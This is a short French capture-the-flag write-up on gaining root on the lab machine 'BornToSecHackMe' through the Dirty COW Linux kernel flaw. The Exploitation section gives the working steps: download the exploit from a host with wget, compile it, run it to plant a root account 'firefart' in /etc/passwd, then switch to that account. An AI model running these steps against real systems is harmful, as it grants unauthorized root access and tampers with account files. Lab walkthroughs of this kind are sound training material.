# Kernel Exploit

### Reconnaissance

Lorsqu'on est connecté en ssh avec l'utilisateur laurie, la phase de reconnaissance nous permet d'avoir la version du kernel:

```
laurie@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

Avec quelques recherche on peux voir que le kernel est sujet a la vulnérabilité copy and write (COW):

*Dirty COW (copy-on-write) est une vulnérabilité de sécurité du noyau Linux qui affecte tous les systèmes d'exploitation Linux, y compris Android. C'est un défaut d'élévation de privilège qui exploite une condition de concurrence dans la mise en œuvre de la copie sur écriture dans le noyau de gestion de la mémoire. Cette vulnérabilité a été découverte par Phil Oester. Un attaquant local peut exploiter cette vulnérabilité pour rendre un fichier accédé en lecture seule en un accès en écriture.*

On va donc télécharger l'exploit et le lancer

- Pour plus d'information sur le fonctionnement de la vulnérabiliter : https://www.youtube.com/watch?v=kEsshExn7aE
- Lien de l'exploit : https://www.exploit-db.com/exploits/40839

### Exploitation

```
laurie@BornToSecHackMe:~$ cd /tmp && wget http://192.168.56.1/dirty.c
[...]
laurie@BornToSecHackMe:/tmp$ gcc dirty.c -o dirty -pthread -lcrypt
laurie@BornToSecHackMe:/tmp$ ./dirty password
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: b7fda000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:/tmp$ 
laurie@BornToSecHackMe:/tmp$ su firefart 
Password: 
firefart@BornToSecHackMe:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
```

Nous sommes bien root.
